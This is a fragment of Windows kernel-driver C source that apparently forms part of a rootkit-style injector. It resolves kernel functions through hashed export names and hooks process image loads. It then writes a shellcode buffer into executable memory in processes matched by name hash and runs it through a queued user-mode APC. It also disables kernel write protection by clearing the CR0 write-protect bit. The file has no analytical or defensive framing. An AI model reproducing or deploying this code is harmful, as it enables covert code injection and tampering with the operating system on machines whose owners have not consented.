				//switch(pImageReloc[uli].Type)
				//{
				//case IMAGE_REL_BASED_DIR64:
				//	*((ULONG_PTR*)(pNewBaseAddress + pImageReloc[uli].Offset)) += ulOffset;
				//	break;
				//case IMAGE_REL_BASED_HIGHLOW:
				//	*((ULONG*)(pNewBaseAddress + pImageReloc[uli].Offset)) += (ULONG)ulOffset;
				//	break;
				//case IMAGE_REL_BASED_HIGH:
				//	*((USHORT*)(pNewBaseAddress + pImageReloc[uli].Offset)) += HIWORD(ulOffset);
				//	break;
				//case IMAGE_REL_BASED_LOW:
				//	*((USHORT*)(pNewBaseAddress + pImageReloc[uli].Offset)) += LOWORD(ulOffset);
				//	break;
				//case IMAGE_REL_BASED_ABSOLUTE:
				//	break;
				//default:
				//	//printf("Unknown relocation type: 0x%08x\n", relInfo->type);
				//	break;
				//}
			}
			pRelocBlock = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)pRelocBlock + pRelocBlock->SizeOfBlock);
		}
	}
#endif
	ulSearchCode = (ULONG*)MyExAllocatePoolWithTag;
	for (uli = 0;uli < 0xA00000;uli++)
	{
		if ((ULONG)*ulSearchCode == 0x00905A4D)
		{
			//g_ulNtoskrnlBase = (ULONG_PTR *)ulSearchCode;
			//g_ulNtoskrnlBase = (ULONG_PTR *)((ULONG_PTR)g_ulNtoskrnlBase - pNtHeader->OptionalHeader.ImageBase + (ULONG_PTR)pNewBaseAddress);
			//g_ulNtoskrnlBase = (ULONG_PTR *)ulSearchCode;
			break;
		}
		(ULONG_PTR)ulSearchCode -= 1;
	}
	for (uli = 0;uli < ulSizeOfImage;uli++)
	{
		if (*(pNewBaseAddress + uli + 0) == 0x80 && \
			*(pNewBaseAddress + uli + 1) == 0x80 && \
			*(pNewBaseAddress + uli + 2) == 0x80 && \
			*(pNewBaseAddress + uli + 3) == 0x80)
		{
			((Function_Entry)((ULONG_PTR)pNewBaseAddress + uli + 0x04))((PVOID)ulSearchCode,MyExAllocatePoolWithTag);
		}
	}
	return 1;
}
ULONG_PTR *x86GetNtoskrnlBase()
{
#ifndef _WIN64
	__asm
	{
		push esi
			call ReadCr4
			mov esi,eax
			and esi,0x20
			mov eax,0x8000000
Continue_Search:
		mov ecx,eax
			shr ecx,0x14
			mov edx,eax
			shr edx,0x0A
			and ecx,0xFFC
			and edx,0x3FFFFC
			sub ecx,0x3FD00000
			sub edx,0x40000000
			test esi,esi
			jz No_PAE
			mov ecx,eax
			shr ecx,0x12
			and ecx,0x3FF8
			test byte ptr [ecx - 0x3FA00000],1
			jz Next_Page
			mov ecx,eax
			shr ecx,0x09
			and ecx,0x7FFFF8
			test byte ptr [ecx - 0x40000000],1
			jnz Cmp_Pe_Magic
			jmp Next_Page
No_PAE:
		test byte ptr [ecx],1
			jz Next_Page
			test byte ptr [edx],1
			jz Next_Page
Cmp_Pe_Magic:
		mov ecx,0x5A4D
			cmp [eax],cx
			jnz Next_Page
			mov ecx,[eax + 0x3C]
		add ecx,eax
			cmp [ecx],0x4550
			jnz Next_Page
			mov edx,[ecx + 0x78]
		test edx,edx
			jz Next_Page
			cmp [ecx + 0x7C],0
			jz Next_Page
			cmp [edx + eax + 0x18],0x320
			jnb Return
Next_Page:
			add eax,0x1000
			cmp eax,0x90000000
			jb Continue_Search
			xor eax,eax
Return:
		pop esi
	}
#else
	return 0;
#endif

}
ULONG_PTR Get_Kernel_Api_From_HashValue(PVOID pImageBase)
{
	PIMAGE_DOS_HEADER pDosHeader;
	PIMAGE_NT_HEADERS pNtHeader;
	PIMAGE_EXPORT_DIRECTORY pExport;
	ULONG *ulAddressOfNames,*ulAddressOfFunctions;
	ULONG ulBase,ulHashValue;
	char* szApiName;
	ULONG uli;
	ULONG ulCurrentHashValue;
	PVOID pCurFuncAddress,pHashValue;
	USHORT *ulAddressOfNameOrdinals;
    //ULONG_PTR ulIndex;
	
	pDosHeader = (PIMAGE_DOS_HEADER)pImageBase;
	pNtHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)pImageBase + pDosHeader->e_lfanew);
	pExport = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)pImageBase +  \
		pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	ulBase = pExport->Base;
	ulAddressOfFunctions = (ULONG*)((ULONG_PTR)pImageBase + pExport->AddressOfFunctions);
	ulAddressOfNames = (ULONG *)((ULONG_PTR)pImageBase + pExport->AddressOfNames);
	ulAddressOfNameOrdinals = (USHORT *)((ULONG_PTR)pImageBase + pExport->AddressOfNameOrdinals);
    
	for (uli = 0;uli < pExport->NumberOfNames;uli++)
	{
		szApiName = (char*)pImageBase + ulAddressOfNames[uli];
		ulHashValue = CalcHashValue(szApiName);
        pCurFuncAddress = (PVOID)&g_pFunctionDat->My_PsSetLoadImageNotifyRoutine;
        pHashValue = (PVOID)&g_pFunctionDat->My_PsSetLoadImageNotifyRoutine_HashValue;
		if ((ULONG)(*(ULONG*)pHashValue))
		{
				do 
				{
					ulCurrentHashValue = (ULONG)(*(ULONG*)pHashValue);
					if (ulHashValue == ulCurrentHashValue)
					{
                        //ulIndex = ulAddressOfNameOrdinals[uli];
                        //ulOffsetFunctions = ulAddressOfFunctions[uli];
						*(ULONG_PTR *)pCurFuncAddress = ulAddressOfFunctions[ulAddressOfNameOrdinals[uli]] + (ULONG_PTR)pImageBase;
                        //*(ULONG_PTR*)pCurFuncAddress = (ULONG_PTR)(ulOffsetFunctions + (ULONG_PTR)pImageBase);
					}
					//My_PsSetLoadImageNotifyRoutine_HashValue = \
					//	(ULONG)*(ULONG_PTR *)((ULONG_PTR)&My_PsSetLoadImageNotifyRoutine_HashValue + sizeof(ULONG));
                    pHashValue = (ULONG_PTR)pHashValue + sizeof(ULONG_PTR) + sizeof(ULONG);
					pCurFuncAddress = (PVOID)((ULONG_PTR)pCurFuncAddress + sizeof(ULONG) + sizeof(ULONG_PTR));
				} while ((ULONG)(*(ULONG*)pHashValue));
		}
	}
	return 0;
}
PVOID GetModuleBaseAddress(PCHAR pModuleName)
{
	ULONG ulNeedLength;
	NTSTATUS Status;
	ULONG ulCurCnt;
	PSYSTEM_MODULE_INFORMATION pSystemModuleInfo;
    PVOID pBaseAddress;

	Status = STATUS_SUCCESS;
	pSystemModuleInfo = NULL;
    pBaseAddress = NULL;
	ulNeedLength = 0;

    do 
    {
        if (g_pFunctionDat->My_ZwQuerySystemInformation)
        {
            Status = g_pFunctionDat->My_ZwQuerySystemInformation(0x0B,pSystemModuleInfo,0,&ulNeedLength);
            if(Status == STATUS_INFO_LENGTH_MISMATCH)
            {
                pSystemModuleInfo = (PSYSTEM_MODULE_INFORMATION)g_pFunctionDat->My_ExAllocatePoolWithTag(NonPagedPool,ulNeedLength,'vDkF');
                if(NULL == pSystemModuleInfo)
                {
                    break;
                }
                CleanZero((PUCHAR)pSystemModuleInfo,ulNeedLength);
            }
            Status = g_pFunctionDat->My_ZwQuerySystemInformation(0x0B,pSystemModuleInfo,ulNeedLength,&ulNeedLength);
            if (NT_ERROR(Status))
            {
                break;
            }
            for (ulCurCnt = 0;ulCurCnt < pSystemModuleInfo->Count;ulCurCnt++)
            {
                if (My_stristr(pSystemModuleInfo->Module[ulCurCnt].ImageName,pModuleName) > 0)
                {
                    pBaseAddress = pSystemModuleInfo->Module[ulCurCnt].Base;
                    break;
                }
            }
        }
    } while (0);
	if(pSystemModuleInfo && \
		g_pFunctionDat->My_ExFreePoolWithTag)
	{
		g_pFunctionDat->My_ExFreePoolWithTag(pSystemModuleInfo,'vDkF');
	}
	return pBaseAddress;
}
PVOID AllocateMemoryFromTargetProcess(PVOID pEProcess)
{
	KAPC_STATE ApcState;
	BOOLEAN bIsAttached;
	PVOID pAllocateAddress;
	NTSTATUS Status;
	SIZE_T AllocateLength;

	Status = STATUS_SUCCESS;
	pAllocateAddress = NULL;
	bIsAttached = FALSE;
	AllocateLength = g_ulInjectShellCodeLength;

	if (pEProcess != g_pFunctionDat->My_IoGetCurrentProcess())
	{
		g_pFunctionDat->My_KeStackAttachProcess(pEProcess,&ApcState);
		bIsAttached = TRUE;
	}
	Status = g_pFunctionDat->My_ZwAllocateVirtualMemory((HANDLE)-1, \
		&pAllocateAddress, \
		0, \
		&AllocateLength, \
		0x3000, \
		0x40);
	if (NT_SUCCESS(Status))
	{
		MyMemcpy((PCHAR)pAllocateAddress,(PCHAR)g_pInjectShellCode,g_ulInjectShellCodeLength);
		g_bInjectProcessFlag = TRUE;
	}
	if (bIsAttached)
	{
		g_pFunctionDat->My_KeUnstackDetachProcess(&ApcState);
	}
	if (NT_SUCCESS(Status))
	{
		return pAllocateAddress;
	}
	return NULL;
}
VOID InjectMonitorThread(PVOID StartContext)
{
	PVOID pEProcess,pCurProc;
	KAPC_STATE ApcState;
	BOOLEAN bIsAttached;
	NTSTATUS Status;
	SIZE_T AllocateLength;

	Status = STATUS_SUCCESS;
	bIsAttached = FALSE;
	pEProcess = NULL;
	AllocateLength = g_ulInjectShellCodeLength;

	pEProcess = NULL;
	if (g_pFunctionDat->My_PsLookupProcessByProcessId((HANDLE)StartContext,(PEPROCESS *)&pEProcess) >= 0)
	{
		if (pEProcess)
		{
			pCurProc = g_pFunctionDat->My_IoGetCurrentProcess();
			if (pEProcess != pCurProc)
			{
				g_pFunctionDat->My_KeStackAttachProcess(pEProcess,&ApcState);
				bIsAttached = TRUE;
			}
#ifndef _WIN64
			Status = g_pFunctionDat->My_ZwAllocateVirtualMemory((HANDLE)-1, \
				&g_pInjectBuffer, \
				0, \
				&AllocateLength, \
				0x3000, \
				0x40);
#else
			Status = g_pFunctionDat->My_ZwAllocateVirtualMemory((HANDLE)0xFFFFFFFFFFFFFFFF, \
				&g_pInjectBuffer, \
				0, \
				&AllocateLength, \
				/*0x3000, \*/
				MEM_COMMIT,
				0x40);

#endif
			if (NT_SUCCESS(Status))
			{
				MyMemcpy((PCHAR)g_pInjectBuffer,(PCHAR)g_pInjectShellCode,g_ulInjectShellCodeLength);
			}
			if (bIsAttached)
			{
				g_pFunctionDat->My_KeUnstackDetachProcess(&ApcState);
			}
			if (pEProcess)
			{
				g_pFunctionDat->My_ObDereferenceObject(pEProcess);
			}
			g_pFunctionDat->My_PsTerminateSystemThread(0xFFFFFFFF);
		}
	}
}
void KernelRoutine(PKAPC *Apc, \
				   PVOID *NormalRoutine, \
				   PVOID *NormalContext, \
				   PVOID *SystemArgument1, \
				   PVOID *SystemArgument2)
{
	if (pApc)
	{
		g_pFunctionDat->My_ExFreePoolWithTag(pApc,'vdkF');
		pApc = NULL;
		//g_pFunctionDat->My_PsRemoveLoadImageNotifyRoutine(InjectNotifyRoutine);
	}
	return;
}
BOOLEAN InsertApc(PVOID pShellCode,PKAPC pApc)
{
	PVOID pKThread;
	BOOLEAN bRet;

	bRet = FALSE;

	pKThread = g_pFunctionDat->My_KeGetCurrentThread();
	g_pFunctionDat->My_KeInitializeApc(pApc, \
		(PETHREAD)pKThread, \
		NULL, \
		KernelRoutine, \
		NULL, \
		pShellCode, \
		UserMode, \
		NULL);
	bRet = g_pFunctionDat->My_KeInsertQueueApc(pApc,(PVOID)NULL,(PVOID)NULL,(LONG)0);
	return bRet;
}
BOOLEAN InjectProcess(HANDLE hProcessId)
{
	HANDLE hThread;
	NTSTATUS Status;
	PVOID pThreadObject;
	BOOLEAN bRet;

	bRet = FALSE;
	Status = STATUS_SUCCESS;
	pThreadObject = NULL;
	//InitializeObjectAttributes(&ObjectAttributes, \
	//	NULL, \
	//	OBJ_KERNEL_HANDLE, \
	//	NULL, \
	//	NULL);
	Status = g_pFunctionDat->My_PsCreateSystemThread(&hThread, \
		0x1FFFFF, \
		NULL, \
		0, \
		NULL, \
		InjectMonitorThread, \
		hProcessId);
	if (NT_SUCCESS(Status))
	{
		Status = g_pFunctionDat->My_ObReferenceObjectByHandle(hThread, \
			0x1FFFFF, \
			NULL, \
			0, \
			&pThreadObject, \
			NULL);
		if (NT_SUCCESS(Status))
		{
			g_pFunctionDat->My_KeWaitForSingleObject(pThreadObject, \
				Executive, \
				KernelMode, \
				FALSE, \
				0);
			g_pFunctionDat->My_ObDereferenceObject(pThreadObject);
			bRet = TRUE;
		}
		g_pFunctionDat->My_ZwClose(hThread);
	}
	return bRet;
}
VOID InjectNotifyRoutine(PUNICODE_STRING FullImageName,HANDLE ProcessId,PIMAGE_INFO ImageInfo)
{
	PUCHAR pImageName;
	PKAPC pApc;
	NTSTATUS Status;
	PVOID pCurProc;
	BOOLEAN bInject;
	ULONG ulHashValue;
	ULONG uli;

	pApc = NULL;
	pImageName = NULL;
	pCurProc = NULL;
	bInject = FALSE;
	ulHashValue = 0;

	if (g_bInjectProcessFlag || !ProcessId)
	{
		//PsRemoveLoadImageNotifyRoutine(InjectNotifyRoutine);
		return;
	}
	Status = g_pFunctionDat->My_PsLookupProcessByProcessId(ProcessId,(PEPROCESS*)&pCurProc);
	if (NT_SUCCESS(Status))
	{
		pImageName = g_pFunctionDat->My_PsGetProcessImageFileName(pCurProc);
		if (pImageName)
		{
			MyStrLower(pImageName);
			ulHashValue = CalcHashValue(pImageName);
			for (uli = 0;uli < INJECT_PROCESS_NUM;uli++)
			{
				if (ulHashValue == g_InjectHashValue[uli])
				{
					bInject = TRUE;
				}
			}
			if (bInject)
			{
				//System_Sleep(WAIT_ONE_MINUTE);
				InjectProcess(ProcessId);
				if (g_pInjectBuffer == NULL)
				{
					if (pCurProc)
					{
						g_pFunctionDat->My_ObDereferenceObject(pCurProc);
					}
					return;
				}
				if (NULL == pApc)
				{
					pApc = (PKAPC)g_pFunctionDat->My_ExAllocatePoolWithTag(NonPagedPool,sizeof(KAPC),'vdkF');
					if (pApc == NULL)
					{
						if (pCurProc)
						{
							g_pFunctionDat->My_ObDereferenceObject(pCurProc);
						}
						return;
					}
				}
				if (InsertApc(g_pInjectBuffer,pApc))
				{
					g_bInjectProcessFlag = TRUE;
				}
			}
		}
	}
	if (pCurProc)
	{
		g_pFunctionDat->My_ObDereferenceObject(pCurProc);
	}
	return;
}
ULONG_PTR StartWork(ULONG_PTR* ulLocalNtoskrnl,PFUNCTION_DAT pFunctionDat)
{
	ULONG_PTR ulRet;

	do 
	{
		ulRet = 0;
		if (pFunctionDat->My_PsSetLoadImageNotifyRoutine)
		{
			pFunctionDat->My_PsSetLoadImageNotifyRoutine(InjectNotifyRoutine);
		}
		else
		{
			ulRet = Get_Kernel_Api_From_HashValue(ulLocalNtoskrnl);
			if (ulRet == 0)
			{
				break;
			}
			if (pFunctionDat->My_PsSetLoadImageNotifyRoutine)
			{
				pFunctionDat->My_PsSetLoadImageNotifyRoutine(InjectNotifyRoutine);
			}
		}
	} while (0);
	return ulRet;
}
BOOLEAN SubEntry(PVOID pNtoskrnlBase,EXALLOCATEPOOLWITHTAG MyExAllocatePoolWithTag)
{
	PVOID pHalBaseAddress;

	pHalBaseAddress = NULL;
#ifndef _WIN64
	if (pNtoskrnlBase == 0)
	{
		pNtoskrnlBase = x86GetNtoskrnlBase();
	}
#endif
	g_pFunctionDat = (PFUNCTION_DAT)MyExAllocatePoolWithTag(NonPagedPool, \
		sizeof(FUNCTION_DAT), \
		'vdkF');
	if (NULL == g_pFunctionDat)
	{
		return FALSE;
	}
	CleanZero((PUCHAR)g_pFunctionDat,sizeof(FUNCTION_DAT));
	InitializeFunctionDat(g_pFunctionDat);
	Get_Kernel_Api_From_HashValue(pNtoskrnlBase);
#ifdef _WIN64
	pHalBaseAddress = GetModuleBaseAddress("hal.dll");
	if (NULL == pHalBaseAddress)
	{
		return FALSE;
	}
#endif
	StartWork(pNtoskrnlBase,g_pFunctionDat);
	return TRUE;
}
#ifndef _WIN64
__declspec(naked) void x86_Call_Work()
{
	__asm
	{
		nop
		nop
		mov eax,0x80808080
		jmp SubEntry
	}
}
#endif

#ifndef _WIN64
__declspec(naked) void x86_Call_Initialize(EXALLOCATEPOOLWITHTAG MyExAllocatePoolWithTag,PUCHAR pBaseAddr)
{
	UNREFERENCED_PARAMETER(pBaseAddr);
	UNREFERENCED_PARAMETER(MyExAllocatePoolWithTag);
	__asm
	{
		mov eax,0x40404040
		jmp Initialize_Reload
	}
}
#endif
ULONG_PTR ReadCr4()
{
	ULONG_PTR ulCr4;
	ulCr4 = 0;
#ifndef _WIN64
	__asm
	{
		_emit 0x0F     // mov cr4,eax
		_emit 0x20
		_emit 0xE0
		mov ulCr4,eax
	}
#else
	ulCr4 = __readcr4();
#endif
	return ulCr4;
}
void Cli()
{
#ifndef _WIN64
	__asm
	{
		mov edx,cr0
		and edx,0xFFFEFFFF
		mov cr0,edx
	}
#else
	ULONG_PTR ulCr0;
	ulCr0 = __readcr0();
	ulCr0 &= 0xFFFFFFFFFFFEFFFF;
	__writecr0(ulCr0);
#endif
}
void Sti()
{
#ifndef _WIN64
	__asm
	{
		mov edx,cr0
		or edx,0x10000
		mov cr0,edx
	}
#else
	ULONG_PTR ulCr0;
	ulCr0 = __readcr0();
	ulCr0 |= 0x10000;
	__writecr0(ulCr0);
#endif

}